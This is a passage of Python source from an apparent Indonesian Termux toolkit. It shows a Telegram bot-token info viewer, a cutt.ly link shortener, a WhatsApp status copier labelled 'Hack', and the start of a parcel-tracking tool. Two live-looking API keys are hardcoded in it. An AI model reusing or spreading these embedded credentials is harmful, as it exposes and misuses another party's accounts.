            data = resp.json()
            if data.get('ok'):
                info['name_id'] = data.get('result', {})
        
    except Exception as e:
        pass
    
    stop.set()
    t.join()
    
    if not info.get('getMe'):
        print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}✗{W} Token Bot Tidak Valid!{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        input(f"\n{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    bot = info['getMe']
    
    json_output = {
        "status": "success",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "bot_info": {
            "id": bot.get('id', 'N/A'),
            "username": f"@{bot.get('username', 'N/A')}",
            "first_name": bot.get('first_name', 'N/A'),
            "last_name": bot.get('last_name', ''),
            "is_bot": bot.get('is_bot', False),
            "can_join_groups": bot.get('can_join_groups', False),
            "can_read_all_group_messages": bot.get('can_read_all_group_messages', False),
            "supports_inline_queries": bot.get('supports_inline_queries', False),
            "can_connect_to_business": bot.get('can_connect_to_business', False),
            "has_main_webhook": bot.get('has_main_webhook', False),
        },
        "bot_name": info.get('name', {}).get('name', 'N/A'),
        "bot_name_id": info.get('name_id', {}).get('name', 'N/A'),
        "bot_description": info.get('description', {}).get('description', 'N/A'),
        "bot_short_description": info.get('short_description', {}).get('short_description', 'N/A'),
        "webhook": {
            "url": info.get('webhook', {}).get('url', 'Tidak ada'),
            "has_custom_certificate": info.get('webhook', {}).get('has_custom_certificate', False),
            "pending_update_count": info.get('webhook', {}).get('pending_update_count', 0),
            "last_error_message": info.get('webhook', {}).get('last_error_message', 'Tidak ada'),
            "max_connections": info.get('webhook', {}).get('max_connections', 40),
        },
        "commands": [
            {"command": cmd.get('command', ''), "description": cmd.get('description', '')}
            for cmd in info.get('commands', [])
        ],
        "admin_rights": {
            "can_change_info": info.get('admin_rights', {}).get('can_change_info', False),
            "can_post_messages": info.get('admin_rights', {}).get('can_post_messages', False),
            "can_edit_messages": info.get('admin_rights', {}).get('can_edit_messages', False),
            "can_delete_messages": info.get('admin_rights', {}).get('can_delete_messages', False),
            "can_invite_users": info.get('admin_rights', {}).get('can_invite_users', False),
            "can_restrict_members": info.get('admin_rights', {}).get('can_restrict_members', False),
            "can_pin_messages": info.get('admin_rights', {}).get('can_pin_messages', False),
            "can_promote_members": info.get('admin_rights', {}).get('can_promote_members', False),
        },
        "updates": {
            "total": len(info.get('updates', [])),
            "last_update": info.get('updates', [{}])[-1] if info.get('updates') else None
        }
    }
    
    json_str = json.dumps(json_output, indent=2, ensure_ascii=False)
    
    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ {G}✓{W} Succesfuly, Information Bot{N}")
    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
    
    lines = json_str.split('\n')
    for line in lines:
        if 'status' in line:
            print(f"{W}│ {G}{line}{N}")
        elif '"' in line and ':' in line:
            parts = line.split(':')
            if len(parts) >= 2:
                key = parts[0].strip()
                value = ':'.join(parts[1:]).strip()
                if 'true' in value.lower() or 'false' in value.lower():
                    print(f"{W}│ {key} {R}: {G}{value}{N}")
                elif value.startswith('"') and value.endswith('"'):
                    print(f"{W}│ {key} {R}: {G}{value}{N}")
                else:
                    print(f"{W}│ {key} {R}: {G}{value}{N}")
            else:
                print(f"{W}│ {G}{line}{N}")
        else:
            print(f"{W}│ {G}{line}{N}")
    
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_link_shortener():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_short = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠉⠙⠻⢿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣀⣀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢠⣴⣿⣿⣿⣷⡄⠀⠀⢹⣿⣿⣿⣿⣿⣿⡆⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣼⣿⣿⣿⣿⣿⣿⠇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⠉⠉⠛⢿⣿⣿⣿⣿⠿⠁⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣀⣀⠀⠀⣠⣿⣿⡿⠉⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢠⣴⣿⡿⣿⣿⣾⣿⠟⠃⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣼⣿⣿⠋⠀⠀⠉⠉⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢀⣴⣿⣿⣿⣿⣷⣤⣀⣀⣀⣀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠈⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢰⣿⣿⣿⣿⣿⣿⡟⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀
⠀⠸⣿⣿⣿⣿⣿⣿⣇⠀⠀⠘⢿⣿⣿⣿⠟⠃⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠹⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠉⠉⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣷⣦⣄⣀⣀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_short}" | lolcat 2>/dev/null || echo "{ascii_short}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Link Shortener {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")

    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
    print(f"{W}│ Masukkan link {R}/{W} URL untuk di Shortener Atau di pendekkan")
    print(f"{W}│ Contoh {R}:{a} https://www.tokopedia.com")
    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
    
    url = input(f"{U}❯❯❯ {W}Masukkan Link {R}/{W} URL {G}❯{N} ").strip()
    
    if not url:
        print(f"{W}[ {R}??{W} ] URL tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url
    
    def load_bar_short(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Memendekkan URL [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop = threading.Event()
    t = threading.Thread(target=load_bar_short, args=(stop,))
    t.daemon = True
    t.start()
    
    short_url = None
    error = None
    status_code = None
    
    API_KEY = "359a67146d8eab794ace58510de8598fe4cae"
    
    try:
        resp = requests.get(f'https://cutt.ly/api/api.php?key={API_KEY}&short={url}', timeout=15)
        data = resp.json()
        
        if data.get('url'):
            status_code = data['url'].get('status')
            
            if status_code == 7:
                short_url = data['url'].get('shortLink')
            elif status_code == 4:
                error = "[ !! ] API Key tidak valid"
            elif status_code == 2:
                error = "[ !! ] URL tidak valid atau sudah di-shorten"
            elif status_code == 5:
                error = "[ !! ] URL mengandung kata terlarang"
            elif status_code == 6:
                error = "[ !! ] Custom alias sudah dipakai"
            else:
                error = f"Error code: {status_code}"
        else:
            error = "[ !! ] Gagal mendapatkan response dari Cutt.ly"
            
    except Exception as e:
        error = str(e)
    
    stop.set()
    t.join()
    
    if short_url:
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} URL Berhasil Dipendekin!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}URL Asli   {R}: {G}{url[:60]}{'...' if len(url) > 60 else ''}{N}")
        print(f"{W}│ {W}URL Pendek {R}: {G}{short_url}{N}")
        print(f"{W}│ {W}Status     {R}: {G}Succesfuly{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    else:
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {R}✗{W} Gagal memendekkan URL!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}Error {R}: {G}{error}{N}")
        if status_code:
            print(f"{W}│ {W}Code  {R}: {G}{status_code}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_Hack_status_wa():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, shutil, threading
    from datetime import datetime
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_status = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣴⣴⣴⣴⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⠿⠟⠛⠋⠋⠋⠙⠙⠙⠛⠻⠿⢿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠿⠛⠉⠀⠀⠀⠀⢀⢀⣀⣀⢀⢀⠀⠀⠀⠀⠈⠙⠻⢿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡿⠛⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠙⢻⣿⣶⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⠏⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠘⢻⣿⣆⠀⠀⠀⠀
⠀⠀⣰⣿⡟⠁⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠹⣿⣷⠀⠀⠀
⠀⢰⣿⡟⠀⠀⢀⣾⣿⣿⣿⠟⠁⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠸⣿⣷⠀⠀
⢠⣿⡿⠀⠀⠀⣾⣿⣿⣿⡏⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠹⣿⣇⠀
⢼⣿⠃⠀⠀⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⠀
⣿⣿⠀⠀⢀⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢼⣿⡅
⣿⣟⠀⠀⠠⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⣸⣿⠇
⢽⣿⡆⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣧⡄⠀⠀⠀⠉⠛⠿⠿⠏⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⠀⠀⠀⣾⣿⠁
⠈⣿⣷⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠃⠀⠀⣸⣿⡏⠀
⠀⠸⣿⣧⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⣀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⠃⠀⠀⢰⣿⡟⠀⠀
⠀⠀⣻⣿⠂⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⣰⣿⡿⠀⠀⠀
⠀⢠⣿⡟⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⣠⣾⣿⠟⠀⠀⠀⠀
⠀⣼⣿⠃⠀⠀⠘⠙⠉⠁⠁⠈⠉⠙⠻⢿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⠀⣠⣾⣿⠟⠁⠀⠀⠀⠀⠀
⢠⣿⡟⠀⠀⠀⠀⡀⣀⣠⣠⣄⣀⠀⠀⠀⠀⠀⠁⠉⠈⠈⠀⠀⠀⠀⠀⢀⣠⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠈⢿⣷⣦⣶⣾⣿⡿⠿⠟⠟⠿⢿⣿⣶⣦⣦⣤⣄⣄⣄⣄⣤⣤⣴⣶⣿⡿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠋⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠟⠟⠟⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_status}" | lolcat 2>/dev/null || echo "{ascii_status}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}downloader Status WA {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯""")
    
    def load_bar_download(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengambil Status WA [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    WA_STATUS_PATHS = [
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
        "/storage/emulated/0/WhatsApp/Media/.Statuses",
        "/sdcard/WhatsApp/Media/.Statuses",
    ]
    
    status_dir = None
    for path in WA_STATUS_PATHS:
        if os.path.exists(path):
            status_dir = path
            break
    
    if not status_dir:
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {W}[ {R}✗{W} ] Folder Status WhatsApp tidak ditemukan!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}[ {R}??{W} ] Pastikan:{N}")
        print(f"{W}│ 1. WhatsApp sudah terinstall{N}")
        print(f"{W}│ 2. Sudah membuka status kontak{N}")
        print(f"{W}│ 3. Beri izin akses storage ke Termux{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
        return
    
    try:
        files = os.listdir(status_dir)
        status_files = [f for f in files if not f.startswith('.') and os.path.isfile(os.path.join(status_dir, f))]
        
        if not status_files:
            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {W}[ {R}??{W} ] Tidak ada status ditemukan!{N}")
            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
            print(f"{W}│ {W}[ {R}!!{W} ] Pastikan kamu sudah membuka status-status kontak terlebih dahulu{N}")
            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
            input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
            return
        
        download_dir = "/sdcard/Status_WA"
        try:
            if not os.path.exists(download_dir):
                os.makedirs(download_dir)
        except:
            download_dir = os.path.join(os.path.expanduser("~"), "storage", "downloads", "Status_WA")
            if not os.path.exists(download_dir):
                os.makedirs(download_dir)
        
        confirm = input(f"{U}❯❯❯ {W}download Semua status? ( {G}Y{W}/{R}n{W} ): {N}").lower()
        if confirm != 'y':
            print(f"{W}[ {R}!!{W} ] Dibatalkan{N}")
            input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
            return
        
        stop = threading.Event()
        t = threading.Thread(target=load_bar_download, args=(stop,))
        t.daemon = True
        t.start()
        
        downloaded = 0
        failed = 0
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        for i, filename in enumerate(status_files, 1):
            try:
                src = os.path.join(status_dir, filename)
                
                ext = os.path.splitext(filename)[1].lower()
                if ext in ['.jpg', '.jpeg', '.png']:
                    prefix = "IMG"
                elif ext in ['.mp4', '.3gp', '.mov']:
                    prefix = "VID"
                else:
                    prefix = "FILE"
                
                new_name = f"{prefix}_{timestamp}_{i:03d}{ext}"
                dst = os.path.join(download_dir, new_name)
                
                shutil.copy2(src, dst)
                downloaded += 1
            except Exception as e:
                failed += 1
        
        stop.set()
        t.join()
        
        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} Download Status Selesai!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {W}total Status {R}: {G}{len(status_files)}{N}")
        print(f"{W}│ {W}berhasil     {R}: {G}{downloaded}{N}")
        print(f"{W}│ {W}gagal        {R}: {R}{failed}{N}")
        print(f"{W}│ {W}lokasi Hasil {R}: {G}/sdcard/Status_WA{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
        
    except Exception as e:
        print(f"{W}[ {R}??{W} ] Error: {e}{N}")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")

def tool_cek_resi():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    API_KEY = "sk_zowtunnrch9ljvt8p7hs6bvfmid9r1hvv5p9qiamsazix6ltvo3kuudcjgwyqtfm"
    
    ascii_resi = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣤⡤⢀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠉⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⡀⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
⠀⣴⣿⡿⠿⠇⢸⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣷⠘⠿⠿⠿⠿⠟⠃⠀⠀⠀⠀
⣸⣿⣏⣀⣀⣀⣀⣉⣉⣉⣉⣁⣀⣀⣀⣀⣀⣀⣀⣀⣀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣁⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⣄⡀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⢰⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡴⠋⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_resi}" | lolcat 2>/dev/null || echo "{ascii_resi}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
